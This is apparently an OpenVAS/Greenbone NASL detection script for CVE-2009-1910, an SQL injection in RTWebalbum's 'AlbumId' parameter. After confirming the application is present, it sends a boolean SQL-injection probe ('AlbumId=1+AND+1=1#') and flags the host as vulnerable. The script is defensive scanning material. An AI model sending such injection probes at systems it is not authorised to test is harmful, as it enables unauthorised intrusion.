if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900373" );
	script_version( "2021-09-01T12:57:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 12:57:33 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2009-06-23 10:30:45 +0200 (Tue, 23 Jun 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-1910" );
	script_bugtraq_id( 34888 );
	script_name( "RTWebalbum SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/35022" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/50406" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to manipulate SQL queries by
  injecting arbitrary SQL code." );
	script_tag( name: "affected", value: "RTWebalbum versions prior to 1.0.574" );
	script_tag( name: "insight", value: "Input passed to the 'AlbumId' parameter in index.php is not properly sanitised
  before being used in SQL queries" );
	script_tag( name: "solution", value: "Upgrade to RTWebalbum version 1.0.574." );
	script_tag( name: "summary", value: "This host is running RTWebalbum and is prone to an SQL Injection
  vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
rtwebPort = http_get_port( default: 80 );
if(!http_can_host_php( port: rtwebPort )){
	exit( 0 );
}
for rtwebDir in nasl_make_list_unique( "/rtwebalbum", http_cgi_dirs( port: rtwebPort ) ) {
	if(rtwebDir == "/"){
		rtwebDir = "";
	}
	rcvRes = http_get_cache( item: rtwebDir + "/admin.php", port: rtwebPort );
	if(!ContainsString( rcvRes, "rtwebalbum" )){
		rcvRes = http_get_cache( item: rtwebDir + "/index.php", port: rtwebPort );
	}
	if(egrep( pattern: "<a\\ href=?[^?]+:\\/\\/sourceforge.net\\/projects\\/rtwebalbum", string: rcvRes ) && egrep( pattern: "^HTTP/1\\.[01] 200", string: rcvRes )){
		sndReq = http_get( item: rtwebDir + "/index.php?AlbumId=1+AND+1=1#", port: rtwebPort );
		rcvRes = http_keepalive_send_recv( port: rtwebPort, data: sndReq );
		if(IsMatchRegexp( rcvRes, "<div\\ id=.?descrp.?>[^<]" ) || IsMatchRegexp( rcvRes, "<div\\ id=.?descrp2.?>[^<]" )){
			security_message( port: rtwebPort, data: "The target host was found to be vulnerable." );
			exit( 0 );
		}
	}
}
exit( 99 );

